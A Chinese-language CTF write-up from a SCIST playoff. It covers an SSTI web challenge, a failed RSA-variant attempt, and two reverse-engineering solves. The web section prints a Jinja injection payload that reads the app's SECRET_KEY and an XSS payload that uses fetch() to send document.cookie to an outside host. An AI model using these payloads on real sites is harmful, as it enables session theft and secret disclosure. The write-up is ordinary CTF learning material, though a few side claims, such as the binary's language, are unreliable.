---
title: SCIST S4 資訊安全季後賽 Writeup
cover: https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/SCIST.jpg
categories: CTF
tags:
    - 資安
    - SCIST
abbrlink: 9deb0a60
date: 2024-07-14 22:59:31
---

# 0x00 前言

終於到了 SCIST 課程結束後的季後賽。我知道我自己肯定還有很多不足的地方，不過依然是挺期待這次的比賽，希望可以再讓自己更進步點。不過沒想到居然只解出兩題...多多少少還是有點打擊自己的信心的。不知道是不是比較沒有天分，又或是說準備的方式有錯誤，總之就是對自己這種好像一直有在學習新知識但比賽卻都沒看見成效的狀態有點自責 + 受挫。不過還是先直接進 Writeup 看一下我的解題過程吧！

# 0x01 Web

## formatter

這題是一個文字的格式化器，說是格式化，他其實只是把兩邊加上貓貓 XD。

![題目](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240714145845517.png)

如果你輸入了一些文字進去，他就會兩邊加上貓貓回傳回來。舉例來說，我先輸入`Test`然後點 Submit，就會出現`😺 Test 😺`。稍微查詢了一下後，發現這題可能是個伺服器模板注入（Server Side Template Injection, SSTI）。這種漏洞就是攻擊者把惡意的代碼注入伺服器端的模板並操控模板引擎執行那些惡意代碼。而這題好像也確實有這個漏洞的存在，因為當我們輸入

```jinja
{% for c in config["SECRET_KEY"] %}
{{c}}
{% endfor %}
```

他回傳的內容會是`😺 c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c 😺`，這長度看起來和 Flag 差不多（?）。到這邊，我就卡住了。這裡之所以只會輸出`c`是因為伺服器代碼中有針對使用者輸入做過濾和替換，會把相連且同向的兩個大括號和替換為空字元，如下。

```python
if request.method == "POST":
        rawtext = request.form.get("rawtext")
        mappings = {"{{": "", "}}": "", ".": "...", "(": ""}
        for mapping in mappings:
            rawtext = rawtext.replace(mapping, mappings[mapping])
        rawtext = "😺 " + rawtext + " 😺"
        return render_template_string(rawtext)
```

到這邊卡住之後，我有看到題目的資料夾中還有另外一個資料夾，名稱叫做 notes。打開來看發現裡面都是一堆像是 XSS 的 Payload，舉幾個例子。

-   `<svg/onload=alert(1)>`
-   `<svg/onload=fetch('http://dev.vincent55.tw:8787?a='+document.cookie)>`

然後還有一個是 Rickroll 的連結 XD。所以到了這時候我就一直很疑惑為甚麼會出現這些 notes，是不是要提示我們這題是 XSS。結果就到了最後還是沒解出這題。

# 0x02 Crypto

## Smoothie

直接看題目吧，我把題目給的加密腳本跟密文 + 公鑰放在一起了。

```python
from Crypto.Util.number import bytes_to_long, getPrime, isPrime, size
from Crypto.Random.random import randrange

from secret import FLAG, SIZE


def mango_a_go_go() -> int:
    while True:
        p = 2
        while size(p) < SIZE:
            p *= getPrime(randrange(2, 12))
        if isPrime(p - 1):
            return p - 1


def strawberries_wild() -> int:
    while True:
        p = 2
        while size(p) < SIZE:
            p *= getPrime(randrange(2, 12))
        if isPrime(p + 1):
            return p + 1


def yogurt() -> int:
    return getPrime(SIZE) ** 2


def main():
    e = 0x10001
    smoothie = strawberries_wild() * mango_a_go_go() * yogurt()
    flag = bytes_to_long(FLAG.encode())
    flag = pow(flag, e, smoothie)
    print(f"flag = {flag}")
    print(f"smoothie = {smoothie}")


if __name__ == "__main__":
    main()

# flag = 469221284029086826023747997560431390782361982638061257450599210708962645002102847975462660638193645789450754543161479618083250809660166042502944853280554224255633426448658481032615217773743807123912268129954755529085653283483845209697030918916368538410596291283961216415664601562539040139144815815020812381504
# smoothie = 697628240852435861833732827649361589992628854136683558886480614847121218068368409674997942839000556721079790078853783722095774006008786802855171763400576735341062935016809334479917656367316628949895516450621001020141725837414164848350808778574391917507635861296067849758069488027024995888841277834894925864271
# e = 65537
```

看完之後應該會發現它就是個 RSA 的變形。原本 RSA 中的 n 在這裡叫做 smoothie，但是原本的 n 應該是由兩個大質數 p 跟 q 所相乘得到的，這題則是由兩個質數和另一個質數的平方相乘所得到的。其中兩個質數是由`mango_a_go_go()`和`strawberries_wild()`得到的，而另一個質數的平方則由`yogurt()`算得。

題目分析到這邊之後，我的思路是去找到歐拉函數 $\phi$ ，然後就可以正常用 $d = e^{-1} \mod \phi(n)$ ，再用 $m = c^{d} \mod n$ 就可以找到明文了。

我先用 [FactorDB](http://factordb.com/) 找看看找不找的到他的分解因數，結果真的找到了。

![FactorDB](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240714153951733.png)

但結果分解出來後竟然只有兩個質因數，雖然和腳本說的有四個質數（其中一個有平方）不一樣，我還是繼續嘗試下去了，我嘗試用這兩個因數去找到 $\phi$ ，腳本如下。

```python
from factordb.factordb import FactorDB
from Crypto.Util.number import long_to_bytes

e = 65537
flag = 469221284029086826023747997560431390782361982638061257450599210708962645002102847975462660638193645789450754543161479618083250809660166042502944853280554224255633426448658481032615217773743807123912268129954755529085653283483845209697030918916368538410596291283961216415664601562539040139144815815020812381504
smoothie = 697628240852435861833732827649361589992628854136683558886480614847121218068368409674997942839000556721079790078853783722095774006008786802855171763400576735341062935016809334479917656367316628949895516450621001020141725837414164848350808778574391917507635861296067849758069488027024995888841277834894925864271

c = flag
n = smoothie

f = FactorDB(n)
f.connect()
factors = f.get_factor_list()

p = factors[0]
q = factors[1]

phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)

m = pow(c, d, n)

print(long_to_bytes(m))
```

解果輸出的東西不是正常的字符。如下。

```txt
b'\xcdB\x16Lp%\xce\xd94G\xcc}G%l{\x0c4!\xb5\xba\xb2{Z\xee\xe0\xe2Aq7\x97\x10\xe2\xae\xb2\x9f\x05\x8c\xa5\xb4b4W\x12\xf8Z\xf9\x90w!<\xb0\xd9l<W&\x1fi\xbe\x9aU\x91\xceB\x9f\x9c\x9a\xbd\x83y\xb1_b\x02\xd1f\x11\xb2\x0b\xbe\x03\x8c\xdb\x01\x10\xcb\xc1\x89v\xed*\xd0\x0e\x9be\x8b\xf7j\xc4\x06\x1b\x17t\xa7s=<\x93\x9f8\x01kj\xc8\xb9\xb9\xcd\xb94\xbb\xee,\x02\xf2\xdd\x9e\x0f'
```

然後這題最後也是沒有寫出來 🥲🥲。應該是 $\phi$ 是錯誤的，畢竟他有四個數，和 FactorDB 分解的不一樣。等到時候別人的 Writeup 出來我再來研究一下解法。

# 0x03 Reverse

## PeekMe

這題給了一個 Binary 文件，我們先執行看看。發現他是一個很簡單的小程式，具體交互內容如下。

```bash
┌──(kali㉿kali)-[~/SCIST/PeekMe]
└─$ ./peekme
1. Say hello.
2. Say goodbye.
3. Exit.
1
Hello!
1. Say hello.
2. Say goodbye.
3. Exit.
2
Goodbye!
1. Say hello.
2. Say goodbye.
3. Exit.
3
```

到這邊，我們大概知道這就是一個可以輸入選項然後有點小功能的東西。接著，既然是 Reverse 題我們就用 IDA 把他打開來看看吧。打開之後大概的內容我放在下面。

```nasm
; int __fastcall main(int argc, const char **argv, const char **envp)
public main
main proc near
; __unwind {
push    rax
mov     rdx, rsi
movsxd  rsi, edi
lea     rdi, _ZN6peekme4main17h8f1a22c22fe4af78E ; peekme::main::h8f1a22c22fe4af78
xor     ecx, ecx
call    _ZN3std2rt10lang_start17h04c8c41c32fd9fd3E ; std::rt::lang_start::h04c8c41c32fd9fd3
pop     rcx
retn
; } // starts at A550
main endp
```

接著用 IDA 的 Decompile 功能把他反編譯後，會得到看得懂的代碼。接著對著`return std::rt::lang_start::h04c8c41c32fd9fd3(peekme::main::h8f1a22c22fe4af78, argc, argv, 0LL);`裡面的`main`點兩下，進到`main`函數中看看他的代碼。（我也不太確定這是甚麼語言，ChatGPT 說是 C++，信他一把。反正不是很重要，能看懂就行）

```cpp
__int64 __fastcall peekme::main::h8f1a22c22fe4af78()
{
  __int64 v0; // rax
  __int64 v1; // rax
  __int64 v2; // rdx
  __int64 v3; // rax
  __int64 v4; // rdx
  char v6[24]; // [rsp+38h] [rbp-140h] BYREF
  char v7[16]; // [rsp+50h] [rbp-128h] BYREF
  __int64 v8; // [rsp+60h] [rbp-118h] BYREF
  __int64 v9; // [rsp+68h] [rbp-110h]
  char v10[48]; // [rsp+70h] [rbp-108h] BYREF
  char v11[48]; // [rsp+A0h] [rbp-D8h] BYREF
  char v12[48]; // [rsp+D0h] [rbp-A8h] BYREF
  char v13[48]; // [rsp+100h] [rbp-78h] BYREF
  char v14[64]; // [rsp+130h] [rbp-48h] BYREF
  __int64 v15; // [rsp+170h] [rbp-8h]

  while ( 1 )
  {
    while ( 1 )
    {
      peekme::print_menu::hfa5f59ad859dee03();
      alloc::string::String::new::hf9d068018f009bc3(v6);
      std::io::stdio::stdin::h89cff74eb89d9610();
      v8 = v0;
      std::io::stdio::Stdin::read_line::hbc05ff0cbbf71c20();
      core::ptr::drop_in_place$LT$core..result..Result$LT$usize$C$std..io..error..Error$GT$$GT$::h26378bc0e070a403(
        v7,
        &v8);
      v1 = _$LT$alloc..string..String$u20$as$u20$core..ops..deref..Deref$GT$::deref::hb7507d927317f778(v6);
      v3 = core::str::_$LT$impl$u20$str$GT$::trim::h83e8a696fa2aacc0(v1, v2);
      v15 = core::str::_$LT$impl$u20$str$GT$::parse::h02bdf3cbed74437f(v3, v4);
      v9 = v15;
      if ( (v15 & 1) == 0 )
        break;
      core::fmt::Arguments::new_const::h2579e8f805344237(v14, &off_58380, 1LL);
      std::io::stdio::_print::h599d580b15036a4c();
      core::ptr::drop_in_place$LT$alloc..string..String$GT$::h40c43e23f371b83b(v6);
    }
    if ( HIDWORD(v9) == 1 )
    {
      core::fmt::Arguments::new_const::h2579e8f805344237(v10, &off_58350, 1LL);
      std::io::stdio::_print::h599d580b15036a4c();
      goto LABEL_12;
    }
    if ( HIDWORD(v9) != 2 )
      break;
    core::fmt::Arguments::new_const::h2579e8f805344237(v11, &off_58360, 1LL);
    std::io::stdio::_print::h599d580b15036a4c();
LABEL_12:
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h40c43e23f371b83b(v6);
  }
  if ( HIDWORD(v9) == 3 )
    return core::ptr::drop_in_place$LT$alloc..string..String$GT$::h40c43e23f371b83b(v6);
  if ( HIDWORD(v9) != 333666999 )
  {
    core::fmt::Arguments::new_const::h2579e8f805344237(v13, &off_58380, 1LL);
    std::io::stdio::_print::h599d580b15036a4c();
    goto LABEL_12;
  }
  core::fmt::Arguments::new_const::h2579e8f805344237(v12, &off_58370, 1LL);
  std::io::stdio::_print::h599d580b15036a4c();
  return core::ptr::drop_in_place$LT$alloc..string..String$GT$::h40c43e23f371b83b(v6);
}
```

可以看到在第 56 行的部分，也就是`if ( HIDWORD(v9) != 333666999 )`的地方，出現了不尋常的選項。前面都是正常的 1~3 的選項，這個 333666999 就看起來很詭異。於是我們`./peekme`，並且輸入`333666999`。果然，就找到 Flag 了！

```txt
SCIST{h0w_diD_y0u_f1nd_m3!}
```

## TinyEncryptor

這題的話，直接執行會發現甚麼東西都沒有，看起來就像是甚麼都沒發生一樣。同時這題題目叫做 TinyEncryptor，並還給了一個`encrypted.txt`，如下。（雖然放了也都是亂碼但還是放一下 XD）

```txt
������̈������������탈�݈ˈ���������ӈ��������̈��̈�������̈�ӈ��ψ������̈��������������؆������ψ���ǈ�݈����ƈ���ǈ��ψ����̈�Έ������̈������݈��̈��݈ˈ����������̈�����������܈�݈�������܈���ǈ��ψ����̈�Έ�����������Ĉ�������������������������̈�������������ψ�������ڈ���Ĉ�����������ӈ�����ψ�ƈ�������̈���݄���̈����ψ��������݈���Ĉ�ψ�������̈�ӈ�������ڈ�������ψ��̈�������φ�����������������݈�������ڈ�݈�������̈�ӈ����������ψ�������ψ�����ˈ�����ψ���������ƈ��ӈ���܈�݈�����������ψ�و��ψ���܈�Έ��ψ�����ǈ��̈��ψ����چ�����݈������������Ĉ�݈��ψ�������ψ�݈��܈���ӈ������̈��ڈ��݈����ڄ���܈���و������܈��݈����ڄ�����������������݈�Έ��ψ���������ӈ���ψ���ψ�������ψ�������܈������̈�������ƈ�و�����ψ�܈�݈�����������݈��������������������̈������ƈ��������ӈ�������݈�و��ψ����ψ�����݈���ƈ�����������و��ψ���������ӆ��������������̈�������������������݈������݈������������Ĉ���ˈ����������Ƅ������ψ���������ψ�������ӈ�����������̈�������܈�����������݈������������������ψ���܈��ψ���������ӈ���Ĉ���ψ��������݈����ڄ����݈����ψ�و������݈��̈������τ���̈���݈���ψ�������ψ���ǈ�ƈ��̇���ڈ����������φ����ӈ���و����ψ���܈������̈�������������Ĉ����ш��������݈��̈������݈�و����ڈ�������̈�������ڈ�������ӈ���ڈ���܈�������݈��������ӈ��������φ���������݈����ƈ����ψ���܈���݈���������ӈ���Ĉ�ψ���̈��������ӈ�و������ψ������Ĉ�����݈���������܈�������݈�������̈�����������݈�و��ψ����ڃ���̈��܈�و�������ψ�������ڈ�������ӆ��������J("��J("�����؈������������݈����Ĉ��̈��섈�������ψ������������݈������݈�����̈���Ą���̈���������������ǈ��������݈������݈��������܈������ψ������̈�����������ƈ����ڈ�������݈�Έ������̆�����������ψ��������ӈ�������݈���܈����ӈ��ш���܈��������݈����݈�����ˈ������̈�������ǈ�����ψ���烆����������݈�Έ���ӈ����������و���݈��������ӈ��ψ�����ψ�����̈�����݈���������܈�Έ������φ��������ӈ�������ݢ������̈��������������������݈��Ј��ӈ���������ӈ�������݄��Έ��������Ĉ��ψ�������̈��ڈˈ����ӈ������̈�����Ǆ����܈�݄�ˈ�����ǈ��������܈�و��ψ����������������ݒ������������܈��Ӣ�����ψ����܈��̈�����ܢ�����ӈ���������������������̈��������Ƣ�����̈������Ϣ�����ψ����������Ƣ������̈����̈����ӈ����������������܈��Ӣ��ψ����������܈��ӈ�݈ˈ�������܈��������͈��̈������ψ��ӈ���ڈ���܈�݈������̈�������ӈ�ƈ��ψ���؈�܈����������ψ���ψ��̈�����܈�ψ������̆���ψ������ψ��ӈ����ڈ�����݈��ψ���؄�����ψ��ψ�����͈��ӈ�݈���̈��ڈ����������ƈ��̈��ڈ���������ƈ�Έ��������ψ���ˈ���܈�و��ψ���؄��݈�����݈���������ψ����������������؈������̆���������݈��ӈ�݈���̈�و����ш��ψ��������ƈ�Έ�����ψ�����������ݒ�����ӈ������̈�������ǈ�����ψ���烈�݈�������̈�و�ψ���ψ�و���ƈˈ�����ǈ�����ڈ��ƈ����ڈ�و����ш��ψ����ڈ�و���ш���܈�ψ��݈ˈ������ψ������̈�������ڃ��������ˈ���������ڈ�������Ĉ������̈�ӈ��ψ������̈��������������؈���ψ�����܈��������݈����������ƈ�������ă��ƈ����ڈ�و�����ψ��݈���������ψ�Έ��ψ����������̈��̈�و����ψ��݈�������ӕ����݈����݈�܈���������ψ��ڈˈ�������ψ����������ڈ������ƈ��������̈����������܈��ӈ���ڈ������τ�ˈ���·��������̈��σ��و����܈ˈ�����ψ����������ƈ�����ˈ������̈�����ӆ���ψ��������̈�����������������̈�و���ψ��ψ���������ƈ�Έ���݈��ӈ�ӈ�������ψ�������݈���̄���܈�����ڈ���������ψ�݈��܈ˈ�����������������܆�������ӈ����������������ӈ�����������������݈�����ƈ�����ӈ���������ƈ���������݈�و������ψ���Ĉ��������ƈ�Έ��������ψ����݈�Έ������J(<��ڈ������τ���������݈�����������������������͈���݆����ƈ��ψ���������������ǈ���݈��܈���ψ���Ĉ�����݈�و��������̈�����ӆ���ψ����܈�������������ƈ������݈��ψ�����ڈ�������͆�������̈������Ϣ�����̈������ψ�������݈������ψ����������ƈ�ӈ���������܈�و�������ǈ������������ƈ����������ƈ������������ψ�������ψ��̈�������ψ���������̆����݈����݈��ψ���ˈ��ƈ�ψ�������̈���ӈ�وˈ���������ڈ����������ƈ�Έ�������ψ��̈�������φ������̈������ψ��ƈ�ψ���̈��ڈ����������������ڈ������τ�����݈��و���؈ˈ������ƈ����ڈ�������ڈ���܈��݈��܈���ƈ�������̈�و�ψ�������̈���Ĉ��܈�ψ���ψ�و���ӈ�܆���������ӄ�ˈ���ڈ��ƈ�����ψ��ψ�����������ƈ�و�܄���̈���̈�܈�و������ψ���τ����ӈ�܈�ƈ��ψ�������ψ�Έ����ڈ�����τ��ڈ���ň�܈�؈���̈�ƈ���ψ����݄���ψ������������ƈ�������ψ�و������܈�܃��������������ӄ���ψ���ڈ��ӈ��ψ�������ψ�و�����ӈ��ψ���������������ǁ݈����������݈�و���ψ�܈���ň��ψ��������ˈ���τ���ӄ�ˈ��������ӈ������ψ��݈�������̆������������̈������τ���ψ������݈�������ӈ��������̈������ˈ��ӈ����̈�و��ψ������̈�������ǈ�����ψ�و���܈���ӈ��ψ���������̈��̈���������̈����͈�����ڈ�ƈ��݈�ڈ��ڈ�������ڈ��ƈ���ӈ�܆��ƈ���݈��������������τ����݈����܈���و������܈�����ψ���ǈ�����������و��ψ���������ڈ�������ˈ��ш�������ڄ��ڈ��������������݈�Έ����ڈ������܈��τ������܈����ڈ�������܈���������ƈ�Έ��ψ�����ڈ�Έ��ψ������������ψ����������Ƣ�����ψ����������ƈ�����݈������݈�و��ψ���ځ݈�������ڈ�و�ψ�������̈�ӈ���������̈������݆���ڈ������τ��������ψ��������݈��ƈ�������ӈ�����������̈������݈�و�������τ���������������݈��������������ڈ�������ψ�و���������܈���������Ĉ������Ĉ�����݈�����������݆��܈����݈�ӈ���������ψ�������ψ�������ψˈ����������ψ�����������܈�������ψ�݈��������ӈ�����������ψ�������ڈ��ƈ���ƈ������܈���݈����������ψ�وˈ�����ψ����ӈ�و���ш���܈��������̈�������ψ�݈��������ӈ������������������݈�����ψ����������ƈ������݈���ψ���ƈ�������̈��ڈ������݈�������ڈ������������݄���������������Ą������������������̈��������������ψ����������ƈ�݈������ӈ�������̈����������͇��ӈ���������ƈ�و���܈��ψ����������ƈ���܈��ƈ���ӈ�ψ���̈�ӈ��ψ�������݈���܈��������̈��ψ����������Ƅ���̈��܈�ӈ�ƈ�����������چ���و���ψ��ψ�����������ψ����Ƅ���ψ���ځ݈����͈�����ڈ�������ψ����̈���̈��ψ������و����ڈ�������݄���܈���ӈ�Έ���ӈ����̈�����܈���܈���ӈ���ψ���������ƈ���������̈���ӈ�Έ��ψ����͈�����ڈ�������φ��������̈�������ψ����ڈ�����������݄����݈�������݈ˈ���ψ���������̈�������ڈ��ψ����͒���������̈����������݈��ψ���ڈ���ǈ�����������܈�݈�܈�݈����������̈�و��ψ����و��������Ǆ������ӈ���������������݈�܈���ǈ�����������̈�و������ڈ���ň����݈�݈�܈�݈�����������̈�Ƅ������̈������ψ�������݈�����������̈�����݈�و�܈���ƈ����̈�و��ψ���̈����τ���̈�����ψ����������ƈ�������݈�����������̈�������ψ���ǈ������������ψ��������ƈ���ƈ�܈�݈���̈�ƈ����ڈ��������݆��و�������ψ��ψ������ӈ�Έ����������ƈ���������݄������܈��������݈����������ƈ��݈���ƈ�������̈�݈ˈ�������Ƅ����������݈ˈ����؈��������ψ�����ψ�و������܈������������ψ�������ӈ�Έ���������Ĉ������݆������Έ�Έ����ψ���������ψ���ƈ�������̈�و�ψ���̈��ڈ������ψ��������Ƅ��ӈ������������������ڈ��ψ䛈����ψ�Έˈ��������ڈ�݈����ӈ�φ������݈�����������ψ�و�������ψ��ψ������ψ������ψ������܈����ψ�����݃��ڈ�������݈ˈ������ψ���܈�������̈������������̆�������������ρ݈���ڈ�������������ڝ���ܝ�������ؑ��Ƌ�
```

應該是個加密腳本，所以我們直接分析他的 Binary，IDA 啟動！

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // eax
  char v5; // [rsp+1Fh] [rbp-11h]
  FILE *v6; // [rsp+20h] [rbp-10h]
  FILE *stream; // [rsp+28h] [rbp-8h]

  if ( argc != 2 )
    return 3;
  v6 = fopen(argv[1], "r");
  if ( !v6 )
    return 2;
  stream = fopen("encrypted.txt", "w");
  if ( !stream )
    return 1;
  while ( 1 )
  {
    v5 = fgetc(v6);
    if ( v5 == -1 )
      break;
    v4 = v5 + 1;
    LOBYTE(v4) = v4 ^ 0xA9;
    fputc(v4, stream);
  }
  fclose(v6);
  fclose(stream);
  return 0;
}
```

打開後發現，這就是一個 XOR 加密。具體工作流程是會對 Flag 的每一個字元的 ASCII 值逐個+1，之後和`0xA9`做 XOR，並寫入加密文件中加密文件中。下面是具體的流程圖。

{% mermaid %}

graph TD
A[Start] --> B[Read character from input file]
B -->|Not EOF| C[Add 1 to ASCII value of character]
C --> D[XOR with 0xA9]
D --> E[Write encrypted character to output file]
E --> B
B -->|EOF| F[Close input file]
F --> G[Close output file]
G --> H[End]

{% endmermaid %}

所以要解密我們就反著來就行，寫了一個解密腳本，如下。

```python
from Crypto.Util.number import bytes_to_long

def decrypt_character(enc_char):
    return chr((enc_char ^ 0xA9) - 1)  # 將字元和0x49 做 XOR，然後 -1


def decrypt_file(input_file, output_file):
    with open(input_file, "rb") as enc_file, open(output_file, "w") as dec_file:
        while True:
            byte = enc_file.read(1)  # 以byte為單位讀取
            if not byte:
                break

            encrypted_char = bytes_to_long(byte)
            decrypted_char = decrypt_character(encrypted_char)
            dec_file.write(decrypted_char)

decrypt_file("encrypted.txt", "decrypted.txt")
```

之後查看 decrypted.txt，會看到以下的內容。

```txt
Trusted Computing (TC) is a technology developed and promoted by the Trusted Computing Group.[1] The term is taken from the field of trusted systems and has a specialized meaning that is distinct from the field of confidential computing.[2] With Trusted Computing, the computer will consistently behave in expected ways, and those behaviors will be enforced by computer hardware and software.[1] Enforcing this behavior is achieved by loading the hardware with a unique encryption key that is inaccessible to the rest of the system and the owner.

TC is controversial as the hardware is not only secured for its owner, but also against its owner, leading opponents of the technology like free software activist Richard Stallman to deride it as "treacherous computing",[3][4] and certain scholarly articles to use scare quotes when referring to the technology.[5][6]

Trusted Computing proponents such as International Data Corporation,[7] the Enterprise Strategy Group[8] and Endpoint Technologies Associates[9] state that the technology will make computers safer, less prone to viruses and malware, and thus more reliable from an end-user perspective. They also state that Trusted Computing will allow computers and servers to offer improved computer security over that which is currently available. Opponents often state that this technology will be used primarily to enforce digital rights management policies (imposed restrictions to the owner) and not to increase computer security.[3][10]:â23â

Chip manufacturers Intel and AMD, hardware manufacturers such as HP and Dell, and operating system providers such as Microsoft include Trusted Computing in their products if enabled.[11][12] The U.S. Army requires that every new PC it purchases comes with a Trusted Platform Module (TPM).[13][14] As of July 3, 2007, so does virtually the entire United States Department of Defense.[15]

Key concepts
Trusted Computing encompasses six key technology concepts, of which all are required for a fully Trusted system, that is, a system compliant to the TCG specifications:

Endorsement key
Secure input and output
Memory curtaining / protected execution
Sealed storage
Remote attestation
Trusted Third Party (TTP)
Endorsement key
The endorsement key is a 2048-bit RSA public and private key pair that is created randomly on the chip at manufacture time and cannot be changed. The private key never leaves the chip, while the public key is used for attestation and for encryption of sensitive data sent to the chip, as occurs during the TPM_TakeOwnership command.[16]

This key is used to allow the execution of secure transactions: every Trusted Platform Module (TPM) is required to be able to sign a random number (in order to allow the owner to show that he has a genuine trusted computer), using a particular protocol created by the Trusted Computing Group (the direct anonymous attestation protocol) in order to ensure its compliance of the TCG standard and to prove its identity; this makes it impossible for a software TPM emulator with an untrusted endorsement key (for example, a self-generated one) to start a secure transaction with a trusted entity. The TPM should be[vague] designed to make the extraction of this key by hardware analysis hard, but tamper resistance is not a strong requirement.

Memory curtaining
Memory curtaining extends common memory protection techniques to provide full isolation of sensitive areas of memoryâfor example, locations containing cryptographic keys. Even the operating system does not have full access to curtained memory. The exact implementation details are vendor specific.

Sealed storage
Sealed storage protects private information by binding it to platform configuration information including the software and hardware being used. This means the data can be released only to a particular combination of software and hardware. Sealed storage can be used for DRM enforcing. For example, users who keep a song on their computer that has not been licensed to be listened will not be able to play it. Currently, a user can locate the song, listen to it, and send it to someone else, play it in the software of their choice, or back it up (and in some cases, use circumvention software to decrypt it). Alternatively, the user may use software to modify the operating system's DRM routines to have it leak the song data once, say, a temporary license was acquired. Using sealed storage, the song is securely encrypted using a key bound to the trusted platform module so that only the unmodified and untampered music player on his or her computer can play it. In this DRM architecture, this might also prevent people from listening to the song after buying a new computer, or upgrading parts of their current one, except after explicit permission of the vendor of the song.

Remote attestation
Remote attestation allows changes to the user's computer to be detected by authorized parties. For example, software companies can identify unauthorized changes to software, including users modifying their software to circumvent commercial digital rights restrictions. It works by having the hardware generate a certificate stating what software is currently running. The computer can then present this certificate to a remote party to show that unaltered software is currently executing. Numerous remote attestation schemes have been proposed for various computer architectures, including Intel,[17] RISC-V,[18] and ARM.[19]

Remote attestation is usually combined with public-key encryption so that the information sent can only be read by the programs that requested the attestation, and not by an eavesdropper.

To take the song example again, the user's music player software could send the song to other machines, but only if they could attest that they were running an authorized copy of the music player software. Combined with the other technologies, this provides a more restricted path for the music: encrypted I/O prevents the user from recording it as it is transmitted to the audio subsystem, memory locking prevents it from being dumped to regular disk files as it is being worked on, sealed storage curtails unauthorized access to it when saved to the hard drive, and remote attestation prevents unauthorized software from accessing the song even when it is used on other computers. To preserve the privacy of attestation responders, Direct Anonymous Attestation has been proposed as a solution, which uses a group signature scheme to prevent revealing the identity of individual signers.

Proof of space (PoS) have been proposed to be used for malware detection, by determining whether the L1 cache of a processor is empty (e.g., has enough space to evaluate the PoSpace routine without cache misses) or contains a routine that resisted being evicted.[20][21]

Here's your flag: SCIST{br3ak_t3e_enCryp71on!}
```

Flag 就找到啦！

```txt
SCIST{br3ak_t3e_enCryp71on!}
```

# 0x04 心得

這次的 Pwn 跟 Misc 幾乎都沒什麼進度，就不特別寫出來了。總結來說這次對自己的表現還是不是很滿意，沒有進步的感覺。雖然有多寫了些題目，但還沒感受到成效。不過沒事，下學期再去牛肉湯好好訓練一下，會盡量讓自己多參加比賽，也在比賽完後看看別人的 writeup 去把不會的題目搞懂。希望自己下次可以再進步一點，越來越好了。
